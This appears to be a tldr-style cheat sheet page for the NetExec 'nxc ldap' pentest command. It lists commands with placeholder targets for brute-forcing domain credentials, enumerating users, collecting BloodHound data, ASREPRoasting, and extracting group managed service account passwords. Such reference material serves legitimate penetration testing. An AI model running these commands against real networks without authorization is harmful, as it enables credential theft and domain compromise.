---
title: "LDAP Exploitation - Control Active Directory | Online Free DevTools by Hexmos"
name: nxc-ldap
path: /freedevtools/tldr/nxc/nxc-ldap
canonical: "https://hexmos.com/freedevtools/tldr/nxc/nxc-ldap/"
description: "Control Active Directory via LDAP exploitation with nxc-ldap. Enumerate users, extract data, and attempt ASREPRoasting attacks. Free online tool, no registration required."
category: common
keywords:
- LDAP Active Directory exploitation
- Active Directory enumeration
- LDAP user extraction
- ASREPRoasting attack
- GMSA password extraction
- Windows domain pentesting
- Network exploitation command
- LDAP password cracking
- nxc exploitation tool
- Domain credentials search
features:
- Search for valid domain credentials using username/password lists.
- Enumerate active users within the Active Directory domain.
- Collect domain data and import it into BloodHound for analysis.
- Attempt ASREPRoasting attacks by collecting AS_REP messages.
- Extract passwords for group managed service accounts (GMSA).
ogImage: "https://hexmos.com/freedevtools/site-banner.png"
twitterImage: "https://hexmos.com/freedevtools/site-banner.png"
---

# nxc ldap

> Pentest and exploit Windows Active Directory Domains via LDAP.
> More information: <https://www.netexec.wiki/ldap-protocol>.

- Search for valid domain credentials by trying out every combination in the specified lists of usernames and passwords:

`nxc ldap {{192.168.178.2}} {{[-u|--username]}} {{path/to/usernames.txt}} {{[-p|--password]}} {{path/to/passwords.txt}}`

- Enumerate active domain users:

`nxc ldap {{192.168.178.2}} {{[-u|--username]}} {{username}} {{[-p|--password]}} {{password}} --active-users`

- Collect data about the targeted domain and automatically import these data into BloodHound:

`nxc ldap {{192.168.178.2}} {{[-u|--username]}} {{username}} {{[-p|--password]}} {{password}} --bloodhound {{[-c|--collection]}} {{All}}`

- Attempt to collect AS_REP messages for the specified user in order to perform an ASREPRoasting attack:

`nxc ldap {{192.168.178.2}} {{[-u|--username]}} {{username}} {{[-p|--password]}} '' --asreproast {{path/to/output.txt}}`

- Attempt to extract the passwords of group managed service accounts on the domain:

`nxc ldap {{192.168.178.2}} {{[-u|--username]}} {{username}} {{[-p|--password]}} {{password}} --gmsa`
